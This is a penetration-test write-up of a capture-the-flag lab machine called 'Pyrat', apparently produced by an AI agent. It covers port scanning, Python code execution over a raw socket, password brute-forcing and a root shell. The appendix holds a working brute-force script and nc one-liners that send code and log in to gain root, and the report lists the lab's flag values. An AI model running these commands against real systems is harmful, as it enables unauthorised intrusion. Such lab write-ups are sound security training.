# Vulnerability Assessment Report: Pyrat

**Target:** 10.64.171.87
**Date:** January 2, 2026
**Tester:** Kali MCP Agent

## Executive Summary
This report details the exploitation of the "Pyrat" machine. The target was running a custom Python application on port 8000. Through manual enumeration and fuzzing, we identified a password brute-force vulnerability, gained administrative access to the application, and subsequently achieved remote code execution (RCE) to compromise the system as the `root` user.

## Findings

### 1. Custom Python Application (Port 8000)
**Severity:** Critical
**Description:** A custom Python server running on port 8000 was found to be vulnerable to unauthenticated code execution (via `exec_python` endpoint) and password brute-forcing.
**Evidence:**
- **Port Scan:** `nmap` revealed port 8000 open.
- **Banner Grabbing:** `curl` identified the server as `SimpleHTTP/0.6 Python/3.11.2`.
- **Code Execution:** Sending python code to the socket resulted in execution.
    - Payload: `print(1337+1337)` -> Output: `2674`
    - Payload: `print(globals().keys())` -> Revealed internal functions like `get_admin`, `shell`, `exec_python`.

### 2. Information Disclosure (.git repository)
**Severity:** High
**Description:** By gaining a shell on the system (initially as `www-data` via the python execution vulnerability), we discovered a `.git` repository in `/opt/dev`.
**Evidence:**
- **Git Log:** `git log` revealed a commit "Added shell endpoint" and a deleted file `pyrat.py.old`.
- **Source Code Recovery:** `git show HEAD:pyrat.py.old` revealed the source code of an older version of the application.
- **Code Analysis:** The source code revealed a `switch_case` function handling endpoints like `shell` and `some_endpoint`. It also showed a password check mechanism.

### 3. Password Brute-Force
**Severity:** High
**Description:** The application's admin login (triggered by sending `admin`) was vulnerable to brute-force attacks.
**Exploitation:**
- A custom Python script was written to fuzz the password using the `rockyou.txt` wordlist.
- **Cracked Password:** `abc123`

### 4. Remote Code Execution (Root)
**Severity:** Critical
**Description:** Authenticating as `admin` with the cracked password allowed access to the `shell` endpoint, which spawned a root shell.
**Exploitation:**
- **Sequence:**
    1. Connect to port 8000.
    2. Send `admin`.
    3. Send `abc123` (Password).
    4. Send `shell`.
- **Result:** Gained a shell as `uid=0(root)`.

## Flags
- **User Flag:** `996bdb1f619a68361417cabca5454705` (Found in `/home/think/user.txt`)
- **Root Flag:** `ba5ed03e9e74bb98054438480165e221` (Found in `/root/root.txt`)

## Recommendations
1.  **Secure the Application:** Remove the `exec_python` functionality or strictly sanitize input.
2.  **Authentication:** Implement strong password policies and rate limiting to prevent brute-force attacks.
3.  **File Permissions:** Restrict access to sensitive directories like `/opt/dev` and ensure `.git` repositories are not accessible.
4.  **Principle of Least Privilege:** Run the application as a non-privileged user, not root.

## Appendix: Reproduction Commands

### Port Scan
```bash
nmap -p- --min-rate 1000 10.64.171.87
```

### Basic Code Execution Test
```bash
echo "print(1337+1337)" | nc -w 5 10.64.171.87 8000
```

### Fuzzing Script (fuzz.py)
```python
import socket
import sys

def check_password(password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(('10.64.171.87', 8000))
        s.send(b'admin\n')
        resp = s.recv(1024)
        if b'Password:' in resp:
            s.send(password.encode() + b'\n')
            resp2 = s.recv(1024)
            if b'Welcome Admin' in resp2:
                print(f'[+] FOUND: {password}')
                sys.exit(0)
        s.close()
    except Exception:
        pass

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        check_password(password)
```

### Gaining Root Shell
```bash
(echo "admin"; sleep 1; echo "abc123"; sleep 1; echo "shell"; sleep 1; echo "id") | nc -w 5 10.64.171.87 8000
```
